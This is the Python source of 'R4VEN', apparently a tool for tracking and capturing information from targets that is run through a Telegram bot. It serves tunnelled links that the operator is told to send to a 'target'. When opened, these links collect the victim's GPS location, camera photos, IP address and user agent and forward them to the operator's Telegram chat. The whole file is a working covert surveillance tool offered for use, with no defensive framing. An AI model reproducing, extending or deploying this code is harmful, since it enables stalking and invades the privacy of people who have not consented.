#!/usr/bin/env python3
import os
import sys
import threading
import logging
import requests
import time
import argparse
import signal
import socket
import subprocess
import re
from flask import Flask, request, Response, send_from_directory
from telebot import TeleBot, types
from flaredantic import FlareTunnel, FlareConfig

# Set up logging
log_file = "raven_telegram.log"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

# Terminal colors
if sys.stdout.isatty():
    R = '\033[31m'  # Red
    G = '\033[32m'  # Green
    C = '\033[36m'  # Cyan
    W = '\033[0m'   # Reset
    Y = '\033[33m'  # Yellow
    M = '\033[35m'  # Magenta
    B = '\033[34m'  # Blue
else:
    R = G = C = W = Y = M = B = ''

# Global variables
VERSION = '1.1.5'
HTML_FILE_NAME = "index.html"
active_sessions = {}  # Store active user sessions
shutdown_flag = threading.Event()
tunnel_url = None  # To store the public URL

# Flask app
app = Flask(__name__)

# Command line arguments
parser = argparse.ArgumentParser(
    description="R4VEN - Track device location, IP address, and capture photos with device details.",
    usage=f"{sys.argv[0]} -t <telegram_token> -p <port>"
)
parser.add_argument("-t", "--token", required=True, help="Telegram bot token")
parser.add_argument("-p", "--port", nargs="?", help="port to listen on", type=int, default=8000)
args = parser.parse_args()

# Initialize Telegram bot
bot = TeleBot(args.token)

# ASCII Banner
def generate_banner():
    sc = R  # Use red as default
    
    if sys.stdout.isatty():
        sys.stdout.reconfigure(encoding='utf-8')
        banner = rf'''{sc}                                                    
                        _.:._
                      ."\ | /".
    {R}.,__{G}              "=.\:/.="              {R}__,.
     {R}"=.`"=._{G}            /^\            {R}_.="`.="
       ".'.'."{B}=.=.=.=.-,/   \,-{B}.=.=.=.=".{sc}'.'."
         `~.`.{M}`.`.`.`.`.     .'.'.'.'.'.'{sc}.~`
            `~.`` {M}` `{sc}.`.\   /.'{M}.' ' ''{sc}.~`
       {G}R4ven{sc}   `=.-~~-._ ) ( _.-~~-.=`
                        `\ /`
                         ( )
                          Y

    {R}Track{W} {G}GPS location{W}, and {G}IP address{W}, and {G}capture photos{W} with {G}device details{W}.
    '''
    else:
        banner = ''
    
    return banner

def print_banners():
    """Prints the program banners"""
    banner = generate_banner()
    print(f'{R}{banner}{W}')
    print(f'{G}[+] {C}Version     : {W}{VERSION}')
    print(f'{G}[+] {C}Created By  : {W}Spyboy')
    print(f'{G}[+] {C}Telegram Bot: {W}Enabled')
    print(f'____________________________________________________________________________\n')
    print(f'{B}[~] {R}Note :{G} Track info will be sent to your Telegram bot {W}\n')

# Flask routes
@app.route("/", methods=["GET"])
def get_website():
    html_data = ""
    try:
        html_data = get_file_data(HTML_FILE_NAME)
    except FileNotFoundError:
        pass
    return Response(html_data, content_type="text/html")

@app.route("/telegram.js", methods=["GET"])
def get_telegram_js():
    return send_from_directory(directory=os.getcwd(), path="telegram.js")

@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    user_id = data.get("user_id")
    
    if user_id in active_sessions:
        # Prepare location message for Telegram
        location_info = (
            f"📍 *Target Location*\n"
            f"Latitude: `{data.get('latitude')}`\n"
            f"Longitude: `{data.get('longitude')}`\n"
            f"Accuracy: `{data.get('accuracy')}m`\n"
            f"Google Maps: https://www.google.com/maps?q={data.get('latitude')},{data.get('longitude')}"
        )
        
        # Send location to Telegram
        bot.send_message(user_id, location_info, parse_mode="Markdown")
        
        # Send the actual location point
        bot.send_location(user_id, data.get('latitude'), data.get('longitude'))
    
    return "OK"

@app.route('/image', methods=['POST'])
def image():
    try:
        # Extract user_id from the request
        user_id = request.form.get('user_id')
        
        if 'image' not in request.files:
            return "No image in request", 400
            
        image = request.files['image']
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f'{timestamp}.jpeg'
        image.save(filename)
        
        # Send image to Telegram user if user_id is available
        if user_id and user_id in active_sessions:
            with open(filename, 'rb') as photo:
                bot.send_photo(user_id, photo, caption="📸 Target's camera capture")
            
            # Get IP and device information
            ip = request.remote_addr
            user_agent = request.headers.get('User-Agent', 'Unknown')
            
            # Send device info message
            device_info = (
                f"📱 *Device Information*\n"
                f"IP Address: `{ip}`\n"
                f"User Agent: `{user_agent}`"
            )
            bot.send_message(user_id, device_info, parse_mode="Markdown")
            
        return "Image captured and sent"
        
    except Exception as e:
        logging.error(f"Error in image capture: {e}")
        return f"Error: {str(e)}", 500

@app.route('/get_target', methods=['GET'])
def get_url():
    return f"{tunnel_url}/process?user_id={request.args.get('user_id', '')}"

@app.route('/process', methods=['GET'])
def process_request():
    user_id = request.args.get('user_id', '')
    option = request.args.get('option', '4')  # Default to all features
    
    # Determine which HTML to serve based on the option
    if option == '1':  # GPS only
        html_file = "gps/index.html"
    elif option == '2':  # Camera only
        html_file = "cam/index.html"
    elif option == '3':  # IP only
        html_file = "ip/index.html"
    else:  # All features
        html_file = "all/index.html"
    
    try:
        html_content = get_file_data(html_file)
        # Insert the user_id into the HTML for callback purposes
        html_content = html_content.replace('const USER_ID = "";', f'const USER_ID = "{user_id}";')
        return Response(html_content, content_type="text/html")
    except FileNotFoundError:
        return "Resource not found", 404

# Utility Functions
def get_file_data(file_name):
    with open(file_name, 'r') as file:
        return file.read()

def is_port_available(port):
    """Check if a port is available."""
    print(f"{B}[?] {C}Checking if port {Y}{port}{W} is available...{W}", end="", flush=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        if sock.connect_ex(("127.0.0.1", port)) != 0:
            print(f" {G}[AVAILABLE]{W}")
            return True
        else:
            print(f" {R}[IN USE]{W}")
            return False

def should_exclude_line(line):
    # Add patterns of lines you want to exclude
    exclude_patterns = [
        "HTTP request"
    ]
    return any(pattern in line for pattern in exclude_patterns)

# Port Forwarding Functions
def is_serveo_up():
    print(f"\n{B}[?] {C}Checking if {Y}Serveo.net{W} is up for port forwarding...{W}", end="", flush=True)
    try:
        response = requests.get("https://serveo.net", timeout=3)
        if response.status_code == 200:
            print(f" {G}[UP]{W}")
            return True
    except requests.RequestException:
        pass
    print(f" {R}[DOWN]{W}")
    return False

def start_port_forwarding():
    """Start port forwarding with Serveo"""
    global tunnel_url
    
    try:
        command = ["ssh", "-R", f"80:localhost:{args.port}", "serveo.net"]
        logging.info("Starting port forwarding with command: %s", " ".join(command))
        
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        url_printed = False
        for line in process.stdout:
            line = line.strip()
            if line:
                if "Forwarding HTTP traffic from" in line and not url_printed:
                    tunnel_url = line.split(' ')[-1]
                    formatted_url_message = (
                        f"\n{M}[+] {C}Serveo URL: {G}{tunnel_url}{W}")
                    print(formatted_url_message)
                    logging.info(formatted_url_message)
                    url_printed = True
                elif not should_exclude_line(line):
                    logging.info(line)
                    print(line)
        
        for line in process.stderr:
            line = line.strip()
            if line:
                if not should_exclude_line(line):
                    logging.error(line)
                    print(line)

    except Exception as e:
        print(f"An error occurred while using Serveo: {e}", "error")

def run_tunnel():
    """Run Cloudflare tunnel"""
    global tunnel_url
    
    try:
        config = FlareConfig(
            port=args.port,
            verbose=True
        )
        with FlareTunnel(config) as tunnel:
            tunnel_url = tunnel.tunnel_url
            print(f"{G}[+] Flask app available at: {C}{tunnel_url}{W}")
            
            # Keep the thread running to monitor the shutdown flag
            while not shutdown_flag.is_set():
                time.sleep(0.5)
    except Exception as e:
        logging.error(f"Error in Cloudflare tunnel: {e}")
        print(f"{R}Error: {e}{W}")

def run_flask():
    """Run Flask server in a separate thread"""
    flask_thread = threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": args.port, "debug": False})
    flask_thread.daemon = True
    flask_thread.start()
    
    # Keep the main thread running to monitor the shutdown flag
    try:
        while not shutdown_flag.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"{R}Flask server terminated.{W}")
        shutdown_flag.set()

def signal_handler(sig, frame):
    """Handles termination signals like CTRL+C."""
    print(f"{R}Exiting...{W}")
    shutdown_flag.set()  # Set the shutdown flag to terminate threads
    sys.exit(0)

# Telegram Bot Handlers
@bot.message_handler(commands=['start'])
def start(message):
    """Handle /start command"""
    user_id = message.from_user.id
    
    # Reset any existing session for this user
    active_sessions[user_id] = {
        'state': 'menu',
        'option': None
    }
    
    # Send welcome message
    welcome_text = (
        f"🦅 *Welcome to R4VEN Telegram Bot* 🦅\n\n"
        f"This bot allows you to track targets and capture information.\n"
        f"Please select one of the options below:"
    )
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("1. Track GPS Location"),
        types.KeyboardButton("2. Capture Image"),
        types.KeyboardButton("3. Get IP Address"),
        types.KeyboardButton("4. All Features")
    )
    
    bot.send_message(user_id, welcome_text, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    """Handle all other messages"""
    user_id = message.from_user.id
    text = message.text
    
    # Initialize user session if not exists
    if user_id not in active_sessions:
        active_sessions[user_id] = {'state': 'menu', 'option': None}
    
    # Handle menu selection
    if text.startswith("1.") or text == "1":
        handle_option_selection(user_id, "1")
    elif text.startswith("2.") or text == "2":
        handle_option_selection(user_id, "2")
    elif text.startswith("3.") or text == "3":
        handle_option_selection(user_id, "3")
    elif text.startswith("4.") or text == "4":
        handle_option_selection(user_id, "4")
    else:
        bot.send_message(user_id, "Please select a valid option or type /start to begin again.")

def handle_option_selection(user_id, option):
    """Handle user's feature selection"""
    # Update user session
    active_sessions[user_id]['option'] = option
    active_sessions[user_id]['state'] = 'tracking'
    
    # Generate tracking URL with user_id parameter
    if tunnel_url:
        tracking_url = f"{tunnel_url}/process?user_id={user_id}&option={option}"
        
        # Determine what's being tracked based on option
        feature_text = {
            "1": "GPS location",
            "2": "camera image",
            "3": "IP address",
            "4": "all information (GPS, camera, IP)"
        }.get(option, "information")
        
        # Send message with tracking URL
        tracking_message = (
            f"🎯 *Tracking URL Generated*\n\n"
            f"Send this link to your target to track their {feature_text}:\n"
            f"`{tracking_url}`\n\n"
            f"_When they open this link, the results will be sent directly to this chat._"
        )
        
        # Create an inline button for easy copying
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Generate New Link", callback_data="new_link"))
        
        bot.send_message(user_id, tracking_message, parse_mode="Markdown", reply_markup=markup)
    else:
        bot.send_message(
            user_id, 
            "Error: Tunnel URL not yet established. Please wait a moment and try again.",
            parse_mode="Markdown"
        )

@bot.callback_query_handler(func=lambda call: call.data == "new_link")
def new_link_callback(call):
    """Handle callback for generating a new link"""
    # Just restart the process
    start(call.message)
    
    # Answer the callback to remove loading state
    bot.answer_callback_query(call.id)

def main():
    """Main function to start the bot and server"""
    print_banners()
    
    # Check if port is available
    if not is_port_available(args.port):
        print(f"{R}Error: Port {args.port} is already in use. Please select another port.{W}")
        sys.exit(1)
    
    # Attach signal handler for CTRL+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start Flask server
    print(f"\n{G}[+] {C}Starting Flask server on port {args.port}...{W}")
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Start Cloudflare tunnel (can be changed to serveo if desired)
    print(f"{G}[+] {C}Starting Cloudflare tunnel...{W}")
    threading.Thread(target=run_tunnel, daemon=True).start()
    
    # Give time for the tunnel to establish
    time.sleep(2)
    
    # Start Telegram bot
    print(f"{G}[+] {C}Starting Telegram bot...{W}")
    bot.infinity_polling()

if __name__ == "__main__":
    main()
